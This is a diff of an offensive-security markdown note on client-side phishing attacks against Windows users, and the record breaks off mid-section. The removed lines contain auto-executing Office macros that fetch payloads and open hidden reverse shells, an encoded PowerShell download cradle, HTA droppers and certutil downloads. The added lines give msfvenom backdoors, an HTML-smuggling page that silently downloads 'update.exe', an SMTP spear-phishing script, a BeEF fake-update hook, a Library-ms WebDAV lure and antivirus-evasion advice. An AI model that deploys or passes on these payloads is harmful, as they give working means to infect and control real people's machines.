@@ -1,692 +1,246 @@
 ---
 title: Client-Side Attacks
-draft: true
+draft: false
 tags:
-  - red-team
-  - offensive
+  - red-teaming
   - phishing
+  - client-side
+  - initial-access
+  - windows
 ---
- 
+
+Client-side attacks target the users of a network rather than its infrastructure. Instead of exploiting a server directly, we deliver a payload to a user's workstation through social engineering — tricked into opening a document, clicking a link, or visiting a webpage. These attacks are especially effective when the network perimeter is well-hardened.
+
+**Attack flow:** Recon → Resource Development → Weaponization → Delivery → Execution
+
+**Sub-topics with dedicated notes:**
+- [[Phishing with Microsoft Office]] — VBA macros, HTA, shellcode runners, MacroPack
+- [[Phishing with Calendars]] — ICS calendar invite phishing
+- [[Pretexting]] — social engineering lures and pretext design
+- [[Command and Control (C2-C&C)]] — post-exploitation once initial access is obtained
+
+---
 # Information Gathering
 
-#### Enumerate metadata and tags from files
+## Enumerate Metadata from Public Documents
 
-- Enumerate PDFs:
+Publicly available documents (PDFs, Word files, Excel spreadsheets) often contain metadata revealing internal usernames, software versions, and creation tools — useful for pretexting and targeting.
+
+Search for public documents:
 ```
-site:DOMAIN filetype:pdf
+site:TARGET_DOMAIN filetype:pdf
+site:TARGET_DOMAIN filetype:docx
 ```
 
 > [!Note]
-> PDFs can also be downloaded from the official website.
+> PDFs can also be downloaded from the official website (press releases, annual reports, job postings, etc.).
 
-- Once downloaded, we can extract the metadata:
+Extract metadata from downloaded files:
 ```bash
 $ exiftool -a -u FILENAME.pdf
 
-Parameters:
--a: display duplicate tags
--u: display unknown tags
+# -a: display duplicate tags
+# -u: display unknown tags
+# Look for: Author, Creator, CreatorTool, Company, LastModifiedBy, Producer
 ```
 
-> [!Note]
-> Look for names, creator tools, creation date...
+This can reveal:
+- Internal employee names (author fields) → use for pretexting sender identity
+- Software versions (Creator Tool) → identify exploitable software on the target
+- Creation dates → understand document workflows
 
-#### Enumerate victim OS and Browser
+## Enumerate Victim OS and Browser
 
-We'll use [_Canarytokens_](https://canarytokens.com/), a free web service that generates a link with an embedded token that we'll send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system.
+Use [Canarytokens](https://canarytokens.com/) to generate a tracking link. Send it to the target (via email, LinkedIn, etc.). When opened, you receive the victim's IP, browser, and OS — useful for building a targeted payload.
 
 ---
-# Create a fingerprinting web site
+# Browser Fingerprinting Website
 
-- Setup web server (in this case Apache web server):
+Set up a fingerprinting page to gather detailed system info from any visitor — useful before delivering a targeted payload.
+
+1. Install Apache:
 ```sh
 $ sudo apt-get install apache2
-```
-
-- Start web server
-```sh
 $ sudo systemctl start apache2
-```
-
-- Navigate to the default dir:
-```sh
 $ cd /var/www/html
 ```
 
-- Clone fingerprintjs2:
+2. Clone fingerprintjs2:
 ```sh
-sudo git clone fingerprintjs2 repo
+$ sudo git clone https://github.com/Valve/fingerprintjs2 fingerprintjs2
 ```
 
-- Navigate in the browser to 127.0.0.1/fingerprintjs2 and view all the info it extracts
+3. Navigate to `http://127.0.0.1/fingerprintjs2` — the page outputs all extracted system info.
 
-- Navigate to the fingerprintjs2 dir and modify the index.html file to not output all the info to hide evidence and also to store the results on a txt file so we can have a log of all systems that navigate to our webpage (fingerprint.js is the script that contains all the logic to fetch the client system info):
+4. Modify `index.html` to silently log the fingerprint to a file instead of displaying it (hide evidence, log multiple victims):
 ```sh
-cd fingerprintjs2
-vim index.html
+$ cd fingerprintjs2
+$ vim index.html
 ```
 
-- Once we get all the system info, we can copy the user agent and navigate to [here](https://explore.whatismybrowser.com/useragents/parse/?analyse-my-user-agent=yes#parse-useragent) to extract the brower being used and the version of the OS.
+5. Parse the collected User-Agent string at https://explore.whatismybrowser.com/useragents/parse/ to identify exact browser version and OS.
 
-# Phishing pretexting
-https://github.com/L4bF0x/PhishingPretexts
+---
+# Resource Development & Weaponization
 
-# Resource development and Weaponization
-Resource development: preparing the payloads and gathering all info and resources to develop the payloads based on the information gathering fase.
-- Focus: adquire the necessary tools, knowledge or resources
-- Stage: preceds weaponization. Once the resources are developed, they are weaponized
-- Activities: research, reconaissanance, and tool development
-- Output: output tools, knowledge and info about the target
-- For example: generating a VBA macro
+**Resource development**: acquiring tools, knowledge, and infrastructure to build the attack (recon, C2 setup, payload generation). Output: tools and knowledge.
 
-Weaponization: packaging/setup/development/conversion of payload into a package/implant that will be sent to the target.
-- Focus: turn the resources into payloads (getting them to send to the target)
-- Stage: after resource development. Once the resources are developed, they are weaponized
-- Activities: creating and configuring attack payloads, crafting malicious files...
-- Output: attack payloads or techniques ready for deployment
-- For example: Inserting or embedding the macro into a document
-## Visual Basic Application (VBA) Macros
-Programming Languaje developed my Microsoft for automating tasks and extending the functionality of Office apps. It can be used to automate processes, interact with Windows API, implement user-defined functions.
-
-Word and Excel allows users to embed VBA macros (programs) in documents/spreadsheets for the automation of manual and repetitive tasks.
-
-Wscript: Windows Script Host object model that provides a scripting environment for executing scripts on Windows-based OS. It can be utilized to extend the capabilities of VBA macros by enabling them to interact with the Windows OS, execute external commands, manipulate files and folders. Its like calling a library or class.
+**Weaponization**: packaging the payload into a deliverable that will be sent to the target. For example, inserting a VBA macro into a Word document and crafting the email lure.
 
 > [!Note]
-> Valid extensions: `.docm`, `.dot` and `.dotm`.
-> Invalid extensions: `.docx`.
+> For VBA macro payloads (Word/Excel), HTA attacks, shellcode runners, and MacroPack automation, see [[Phishing with Microsoft Office]].
 
-- Hello World:
-```vb
-Sub HelloWorld()
-'
-' HelloWorld Macro
-'
-'
+---
+# File Smuggling with HTML and JavaScript
 
-    MsgBox "Hello World!", vbInformation, "Message Box Demo"
-
-End Sub
-```
-
-- Execute external program:
-```vb
-Sub PoC()
-    Dim payload As String
-    payload = "calc.exe"
-    CreateObject("Wscript.shell").Run payload, 0, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle, Wait for completion?
-    ' Windowstyle:
-    ' 0 -> hides the window and activates another window (run the process in background)
-    ' 1 -> activates and displays the window and the window is minimized or maximized the system restores it to its original position
-    ' 2 -> activates the window and displays it as minimized window
-    ' 3 -> activates the window and displays it as maximized window
-End Sub
-```
-
-- Execute program (good version) + open when document is opened:
-```vb
-Sub Document_Open() 'Use Workbook_Open if its an excel file
-    PoC ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    PoC ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub PoC()
-    Dim wsh As Object ' create variable "wsh" that is type Object
-    Set wsh = CreateObject("Wscript.shell") ' Set the variable to the function CreateObject
-    wsh.Run "notepad.exe", 2, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle
-End Sub
-```
-
-> [!Note]
-> Both procedures (`Document_Open` and `AutoOpen`) differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.
-
-- Read the registry:
-```vb
-Sub Document_Open()
-    RegRead ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    RegRead ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub RegRead()
-    Dim wsh As Object
-    Set wsh = CreateObject("Wscript.shell")
-    
-    Dim regKey As String
-    regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-    MsgBox "Product Name: " & wsh.RegRead(regKey & "\ProductName")
-End Sub
-    
-```
-
-Save as **Word Macro-Enabled Document** (.docm) or **Word 97-2003 Document** (.doc -> best option)
-
-## Weaponizing VBA Macros With MSF
-Native `vba` msfvenom format is problematic with future versions of Microsoft Office. Use `vba-psh` or `vba-cmd` better.
-
-```sh
-$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-exe
-```
-Check output steps:
-
-1. Copy the Macro into the office document macro editor
-2. The hex dump must be appended to the end of the document contents (litteraly paste it on the document -> try to masquerade it somehow obviously)
-3. Set up a multi/handler and open the document
-
-```sh
-$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-psh
-```
-
-1. Copy the Macro into the office document macro editor
-2. Set up a multi/handler and open the document
-
-- Encoded payload:
-```sh
-$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f vba-psh
-```
-
-## VBA Powershell Dropper
-Dropper: malicious code or payload that dont gain initial access but downloads external payloads that will be used to gain the initial access.
-
-We will create a Word document that downloads a payload with powershell and later executes it:
-
-1. Create the payload:
-```sh
-$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe > shell.exe
-```
-
-2. Host the payload on a web server
-```sh
-$ sudo python3 -m http.server LOCAL_PORT
-```
-
-3. Create the word document with a macro that downloads the payload and executes it:
-```vb
-Sub Document_Open()
-    dropper ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    dropper ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub dropper()
-    Dim url As String ' variable that stores remote web server address
-    Dim psScript As String ' variable that stores PowerShell script/command to execute
-    
-    url = "http://LOCAL_HOST:LOCAL_PORT/shell.exe" ' URL of the remote web server hosting the payload for initial access
-
-	' PowerShell script to download and execute the file
-    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Temp\file.exe"";" & vbCrLf & _
-    "Start-Process -FilePath ""C:\Temp\file.exe"""
-
-	' Execute the PowerShell script using Shell and hides the window for extra stealth'
-    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vdHide"
-End Sub
-```
-- `vbCrLf` is used to represent `\n`
-- Triple " are used to include a single " in the string
-- Setup a multihandler on LHOST and LPORT of the payload and open de document
-
-## VBA reverse shell macro with Powercat
-Powercat: powershell version of netcat
-Repo: https://github.com/secabstraction/PowerCat
-
-1. Host powercat:
-```sh
-$ python3 -m http.server LOCAL_PORT
-```
-
-3. Setup a listener:
-```sh
-$ nc -nlvp LOCAL_PORT
-```
-
-4. Create the VBA macro that reaches the powerchat
-```vb
-Sub Document_Open()
-    powercat ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    powercat ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub powercat()
-    Dim url As String ' variable that stores remote web server address
-    Dim psScript As String ' variable that stores PowerShell script/command to execute
-    
-    url = "http://LOCAL_HOST:LOCAL_PORT/powercat.ps1" ' URL of the remote web server hosting the payload for initial access
-
-	' PowerShell script to download and execute the file
-    psScript = "IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c LOCAL_HOST -p LOCAL_PORT -e cmd"
-
-	' Execute the PowerShell script using Shell and hides the window for extra stealth'
-    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vdHide"
-End Sub
-```
-
-**Encoded reverse shell**
-1. Generate encoded reverse shell on attack machine:
-```sh
-LHOST=LOCAL_HOST
-LPORT=LOCAL_PORT
-pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('POWERCAT_PS1_URL'); powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/reverse-shell.exe
-```
-
-2. Host the reverse shell:
-```sh
-$ cd /tmp
-$ python3 -m http.server LOCAL_PORT
-```
-
-3. Create the macro:
-```vb
-Sub Document_Open()
-    powercat ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    powercat ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub powercat()
-    Dim Str As String
-    Str = "powershell -c ""$code=(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/reverse_shell.txt');IEX 'powershell -E $code'"""
-    CreateObject("Wscript.Shell").Run str
-```
-
-Here the only difference is that the reverse shell is encoded with powershell encode so powershell knows how to decode it (this will be done in memory) and executed
-
-## Encoded Reverse shell (payload)
-This option is recommended to guarantee that the command will be executed correctly and wont fail due to a special character.
-
-1. Encode the payload:
-```
-$ echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell" | base64
-
-SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
-Oi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4y
-IC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo=
-```
-
-2. Split the base64 encoded string into pieces of 50 characters:
-```python
-str = "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40OS42Mi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ5LjYyIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo="
-
-n = 50
-
-for i in range(0, len(str), n):
-	print("Str = Str + " + '"' + str[i:i+n] + '"')
-```
-
-> [!Note]
-> Make sure that in the base64 string payload we dont introduce any new lines.
-
-3. Execute the script:
-```
-$ vim script.py
-$ chmod +x script.py 
-$ python3 script.py 
-Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
-Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
-Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
-Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
-Str = Str + "WUgcG93ZXJzaGVsbAo="
-```
-
-4. Create the macro:
-```vba
-Sub AutoOpen()
-    MyMacro
-End Sub
-
-Sub Document_Open()
-    MyMacro
-End Sub
-
-Sub MyMacro()
-    Dim Str As String
-    
-    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
-	Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
-	Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
-	Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
-	Str = Str + "WUgcG93ZXJzaGVsbAo="
-
-    CreateObject("Wscript.Shell").Run Str
-End Sub
-```
-
-## Using activeX controls for Macro Execution
-ActiveX: technologies developed my Microsoft for creating interactive content within web pages and desktop applications.
-
-It provides a framework for developing reusable software components, known as ActiveX Controls, which can be embedded in web pages, documents... In the case of Office documents, it allows the execution of Macros.
-
-By using ActiveX Controls, we can execute the macros automatically when the document is opened. This is useful to avoid AV detecion of AutoOpen and Document_Open macros
-
-Word -> Developer -> Controls -> Legacy Controls -> More Controls -> Microsoft InkEdit Control
--> View Code
-
-Replace InkEdit1_Change with InkEdit1_GotFocus for automatic execution of the VBA macro:
-```vb
-Sub InkEdit1_GotFocus()
-    ' VBA macro code here
-End Sub
-```
-
-## Pretexting
-Repo: https://github.com/martinsohn/Office-phish-templates
-
-## HTML Applications (HTA)
-Apps created using HTML, CSS and JS that run in a special environment using IE.
-HTA files have the .hta extension
-HTA apps allows the arbitrary execution of programs/code with IE or using mshta.exe (used by IE)
-
-HTA files are executed by mshta.exe, which is the HTML application host. This executable allows HTAs to have more priviledged access to the system than standard web pages. 
-
-HTAs have access to the local filesystem, registry and can execute **ActiveX controls**.
-
-mshta.exe is the HTML Application Host, which is used to execute HTML applications. 
-
-POC:
-1. Go to /var/www/html and create a `poc.hta`:
-```html
-<html>
-	<head>
-		<script>
-			var payload = "calc.exe"
-			new ActiveXObject('Wscript.Shell').Run(payload);
-		<script>
-	</head>
-	<body>
-		<h1> HTA POC </h1>
-		<script>
-			self.close(); // to avoid the window with the html to open
-		</script>
-	</body>
-</html>
-```
-
-2. Start the web server:
-```sh
-sudo systemctl start apache2
-```
-
-3. Navigate to `LOCAL_IP/poc.hta` and accept all:
-
-The HTA file will be executed with mshta.exe outside of the browser sandbox so we will get the privileges of the current user. 
-
-## HTA Attacks
-
-1. Go to the apache dir:
-```sh
-$ cd /var/www/html/
-```
-
-2. Create a payload:
-```sh
-$ msfvenom LHOST=LOCAL_IP LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f hta-psh -o shell.hta
-```
-
-3. Setup a listener:
-```
-nc -nlvp LOCAL_PORT
-```
-
-4. Navigate to `http://LOCAL_HOST/shell.hta` and open the file
-
-Another option is to create a Word document with a macro that executes the HTA application (follow above steps to host the HTA file):
-```vb
-Sub Document_Open()
-    ExecuteHTA ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub AutoOpen()
-    ExecuteHTA ' this subroutine is triggered when the document is opened
-End Sub
-
-Sub ExecuteHTA()
-    Dim url As String ' variable that stores remote web server address
-    Dim command As String ' variable that stores PowerShell script/command to execute
-    
-    url = "http://LOCAL_HOST/shell.hta" ' URL of the remote web server hosting the payload for initial access
-
-	' PowerShell script to execute the HTA app
-    command = "mshta.exe " & url
-
-	' Execute the PowerShell script using Shell and hides the window for extra stealth'
-    Shell command, vbNormalFocus
-End Sub
-```
-
-## Automating Macro development with MacroPack
-
-Help
-```powershell
-PSH> .\macro_pack.exe --help
-```
-
-List formats:
-```powershell
-PSH> .\macro_pack.exe --listformats
-```
-
-Arbitrary Command Execution:
-```powershell
-PSH> echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
-Parameters: 
--t: specifies the type of payload/template being used, in this case the template type is **CMD**.
--o: This enables VBA code obfuscation.
--G: This specifies the name and type of the output file, in this case the output file is "test.doc".
-"calc.exe": it can be a command ("cat") or an executable and is going to be executed by the payload type
-```
-
-List templates (payload type: dropper, cmd, ...):
-```powershell
-PSH> .\macro_pack.exe --listtemplates
-```
-
-Generate meterpreter reverse shell payload and inject it:
-```powershell
-PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT | .\macro_pack.exe -o -G "resume.doc"
-
-PSH> msfconsole.bat
-msf> use multi/handler
-msf> set options..
-msf > run
-
-PSH> python -m http.server 8080
-
-*Go to the target machine and download and run the document*
-```
-
-Dropper:
-```powershell
-1. Create the payload we are going to host
-PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f exe -o update.exe
-
-2. Create the malicious document that will download and execute the payload we are hosting
-PSH> echo "http://LOCAL_HOST:HTTP_LOCAL_PORT/update.exe" "update.exe" | .\macro_pack.exe -t DROPPER -o -G "Accounts2025.xls"
-
-3. Setup a listener for the payload when executed
-PSH> msfconsole.bat
-msf> use multi/handler
-msf> set options..
-msf > run
-
-4. Setup a server for downloading the payload
-PSH> python -m http.server HTTP_LOCAL_PORT
-
-*Go to the target machine and download and run the document*
-```
-
-## Macro reverse shell
-
-1. Open libreoffice:
-```bash
-$ libreoffice
-```
-
-2. Create the macro: Go to Tools -> Macros -> Organize Macros -> Basic -> New (create a new one over the document we are using)
-```vb
-Sub Main
-	Shell("cmd /c certutil -urlcache -split -f http://192.168.45.215/shell.exe C:\Windows\Temp\shell.exe")
-	Shell("cmd /c C:\Windows\Temp\shell.exe")
-End Sub
-```
-
-3. Insert the macro in the document: Go to Tools -> Customize -> Events -> Open Document and select the
-
-
-## File smuggling with HTML and JavaScript
-Delivery: attacker delivers the payload or malicious document to the target. 
-HTTP Smuggling: delivery method to deliver hidden payloads through emails or websites. 
-Configure a website to smuggle the payload and bypass the client side filter. Configure the web page to save the payload into the target system.
-
-- Create a malicious html website hosted on our attack machine that will contain a malicious payload:
+Deliver a payload directly through a webpage that auto-downloads an executable when the victim visits it. The executable is embedded as base64 inside the HTML, bypassing network-level file scanning since no external file is fetched.
 
 1. Generate the payload:
 ```sh
 $ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
 ```
 
-2. Convert the payload into base64:
+2. Encode the payload as base64:
 ```sh
 $ base64 -w0 backdoor.exe > base64.txt
 ```
 
-3. Naviagte to the Apache default directory and create the index.html file:
-```sh
-$ cd /var/www/html
-$ vim index.html
-```
-
-4. Insert the contents of the HTML web page with the JS so that when the victim loads the webpage it will download the payload. Inject the encoded payload into the `file` variable:
+3. Create the HTML delivery page (`/var/www/html/index.html`). Paste the base64 string into the `file` variable:
 ```html
-<html> 
-	<body> 
-		<script> 
-			function base64ToArrayBuffer(base64) { 
-				var binary_string = window.atob(base64); 
-				var len = binary_string.length; 
-				var bytes = new Uint8Array( len ); 
-				for (var i = 0; i < len; i++) { 
-					bytes[i] = binary_string.charCodeAt(i); 
-				} 
-				return bytes.buffer; 
+<html>
+	<body>
+		<script>
+			function base64ToArrayBuffer(base64) {
+				var binary_string = window.atob(base64);
+				var len = binary_string.length;
+				var bytes = new Uint8Array(len);
+				for (var i = 0; i < len; i++) {
+					bytes[i] = binary_string.charCodeAt(i);
+				}
+				return bytes.buffer;
 			}
-			var file ='<backdoor.exe Base64 Encoded Value>'; 
-			var data = base64ToArrayBuffer(file); 
-			var blob = new Blob([data], {type: 'octet/stream'}); 
-			var fileName = 'msfstaged.exe'; 
-			var a = document.createElement('a'); document.body.appendChild(a); a.style = 'display: none'; 
-			var url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); window.URL.revokeObjectURL(url); 
-		</script> 
-	</body> 
+			var file = '<backdoor.exe Base64 Encoded Value>';
+			var data = base64ToArrayBuffer(file);
+			var blob = new Blob([data], {type: 'octet/stream'});
+			var fileName = 'update.exe';
+			var a = document.createElement('a');
+			document.body.appendChild(a);
+			a.style = 'display: none';
+			var url = window.URL.createObjectURL(blob);
+			a.href = url;
+			a.download = fileName;
+			a.click();
+			window.URL.revokeObjectURL(url);
+		</script>
+	</body>
 </html>
 ```
 
-5. Start the apache service:
+4. Start Apache and the Meterpreter listener:
 ```sh
 $ service apache2 start
-```
 
-6. Setup a handler for receiving the connection:
-```sh
 msf> use multi/handler
-msf> set options...
+msf> set payload windows/meterpreter/reverse_tcp
+msf> set LHOST LOCAL_HOST
+msf> set LPORT LOCAL_PORT
+msf> run
 ```
 
-## Initial access via Spear Phishing Attachment
-1. Create the malicious payload:
+5. Send the URL to the victim via phishing email. When they visit the page, the browser auto-downloads and saves the payload.
+
+> [!Warning] OPSEC
+> - The file is written to the victim's **Downloads** folder — AV will scan it on write. Use an encoded/obfuscated payload or a staged payload (`-f exe` with meterpreter stager) to reduce detection.
+> - The filename (`update.exe`) should match the pretext — `Chrome_Update.exe`, `VPN_Client.exe`, etc.
+> - This technique bypasses email attachment filters since only a URL is sent, not a file.
+
+---
+# Spear Phishing Attachment via SMTP
+
+Send a malicious executable directly as an email attachment using Python's smtplib. Requires access to an SMTP server (compromised internal relay, or an external SMTP with auth).
+
+1. Generate the payload:
 ```sh
 $ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
 ```
 
-2. Create the python script that will use SMTP to send the malicious email (we can compromise a company SMTP server to send the email):
-```sh
-$ vim email_send.py
-```
-
+2. Create the sending script (`email_send.py`):
 ```python
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+
 fromaddr = "attacker@fake.net"
-toaddr = "bob@ine.local"  
-# instance of MIMEMultipart
+toaddr = "target@company.com"
+
 msg = MIMEMultipart()
-# storing the senders email address  
 msg['From'] = fromaddr
-# storing the receivers email address 
 msg['To'] = toaddr
-# storing the subject 
-msg['Subject'] = "Subject of the Mail"
-# string to store the body of the mail
-body = "Body_of_the_mail"
-# attach the body with the msg instance
+msg['Subject'] = "Q3 Security Report - Action Required"
+
+body = "Please find the attached security report for your review."
 msg.attach(MIMEText(body, 'plain'))
-# open the file to be sent 
-filename = "Free_AntiVirus.exe"
+
+filename = "SecurityReport_Q3.exe"           # convincing filename
 attachment = open("/root/backdoor.exe", "rb")
-# instance of MIMEBase and named as p
+
 p = MIMEBase('application', 'octet-stream')
-# To change the payload into encoded form
-p.set_payload((attachment).read())
-# encode into base64
+p.set_payload(attachment.read())
 encoders.encode_base64(p)
 p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-# attach the instance 'p' to instance 'msg'
 msg.attach(p)
-# creates SMTP session
-s = smtplib.SMTP('demo.ine.local', 25)
-# Converts the Multipart msg into a string
+
+s = smtplib.SMTP('SMTP_SERVER', 25)          # target SMTP server
 text = msg.as_string()
-# sending the mail
 s.sendmail(fromaddr, toaddr, text)
-# terminating the session
 s.quit()
 ```
 
-3. Set the listener to receive the connection:
+3. Setup the listener:
 ```sh
-$ msfconsole
 msf> use multi/handler
 msf> set LHOST LOCAL_HOST
 msf> set LPORT LOCAL_PORT
+msf> set payload windows/meterpreter/reverse_tcp
 msf> run
 ```
 
 4. Send the email:
 ```sh
-python3 email_send.py
+$ python3 email_send.py
 ```
 
-## Establishing a shell through victims web browser
-Tool Browser explorer exploitation framework (BEEF)
-We are going to host a phishing website that will be sent to the victim through a link. 
-Prerequisite: gather info about the victim browser
+Alternatively, use **swaks** for a quicker send:
+```bash
+$ sudo swaks -t target@company.com --from hr@company.com \
+  --attach @backdoor.exe --server SMTP_SERVER_IP \
+  --body "Please review the attached document." \
+  --header "Subject: Q3 Payroll Report"
+```
 
-Start beef:
+> [!Warning] OPSEC
+> - Sending an `.exe` attachment will be blocked by virtually all modern email gateways. Use a document payload ([[Phishing with Microsoft Office]]) or HTML smuggling instead.
+> - For `.doc`/`.docx` payloads with swaks: `--attach @document.doc`
+
+---
+# Browser Exploitation with BeEF
+
+BeEF (Browser Exploitation Framework) hooks victim browsers via a JavaScript snippet injected into a page the victim visits. Once hooked, BeEF provides a command interface to interact with the victim's browser — executing client-side attacks, extracting info, and delivering further payloads.
+
+1. Start BeEF:
 ```sh
 $ sudo beef-xss
 ```
 
-Navigate to `127.0.0.1:3000/ui/panel` and login to beef with `beef:password`
+Navigate to `http://127.0.0.1:3000/ui/panel` and login (`beef:beef` or configured password).
 
-Create a malicious website and inject the BEEF hook to hook all the victims that search the website:
+2. Create a malicious phishing page that loads the BeEF hook:
 ```html
 <html>
 	<head>
-		<script src="http://LOCAL_IP:3000/hook.js"></script>
+		<script src="http://ATTACKER_IP:3000/hook.js"></script>
 	</head>
 	<body>
 		<h1>Please update your browser to access the website</h1>
@@ -694,35 +248,40 @@ Create a malicious website and inject the BEEF hook to hook all the victims that
 </html>
 ```
 
-Start the apache service:
+3. Host the page with Apache and send the URL to the victim:
 ```sh
 $ service apache2 start
 ```
 
-Create the payload and setup a multi/handler listening for the payload to be executed:
-```sh
-$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
-```
+4. Once a victim visits the page, their browser appears in the BeEF panel under "Hooked Browsers".
 
-Host the payload with a server:
+5. From the BeEF interface → **Commands** tab → select **Fake Notification Bar**:
+   - Set **Plugin URL** to a hosted Meterpreter payload
+   - Set a convincing message (e.g., "Browser update required — click to install")
+
+6. Generate and host the follow-up payload:
 ```sh
+$ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
 $ python3 -m http.server 8080
+
+msf> use multi/handler
+msf> set LHOST ATTACKER_IP
+msf> set LPORT LOCAL_PORT
+msf> set payload windows/meterpreter/reverse_tcp
+msf> run
 ```
-
-On beef interface, go to commands section and select the fake notification bar. Set the plugin URL to the payload that we are hosting, and set the message.
-
-## Windows Library Files (Phishing)
-
-Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are _General library information_, _Library properties_, and _Library locations_.
-
-1. Create the Windows Library File (from a Windows host):
-
-Open VS Code and just save a blank file called `config.Library-ms` on the Desktop.
 
 > [!Note]
-> Library files have the extension `.Library-ms`, for example `config.Library-ms`
+> BeEF requires the victim to have JavaScript enabled and to stay on the hooked page. It's most effective against older or unpatched browsers. Modern browsers have significantly reduced the attack surface for client-side browser exploits.
 
-2. Open the previous file again and add the following code:
+---
+# Windows Library Files Phishing
+
+Windows Library Files (`.Library-ms`) point to a location — local folder or remote WebDAV share — that appears as a Windows Explorer folder. Sending this file as an attachment causes the victim's Explorer to connect to an attacker-controlled WebDAV share when they open it, displaying the share's contents as a normal folder. A `.lnk` shortcut inside the share executes the payload.
+
+**Why it works:** `.Library-ms` files open automatically in Explorer without any macro security warnings. The victim just needs to open the attachment.
+
+1. Create `config.Library-ms` (on a Windows host or Kali with the right template):
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -738,110 +297,110 @@ Open VS Code and just save a blank file called `config.Library-ms` on the Deskto
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://LOCAL_HOST</url>
+<url>http://ATTACKER_WEBDAV_HOST</url>    <!-- WebDAV server URL -->
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
 </libraryDescription>
 ```
 
-> [!Note]
-> Change the `url` tag to the WebDAV server host.
-
-3. Create a `.LNK` called `automatic_configuration.lnk` with the following contents to execute the reverse shell:
+2. Create the payload `.lnk` shortcut (`automatic_configuration.lnk`) that runs a PowerShell reverse shell when clicked:
 ```powershell
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/powercat.ps1'); powercat -c LOCAL_HOST -p LISTENER_PORT -e powershell"
+# Target field of the shortcut:
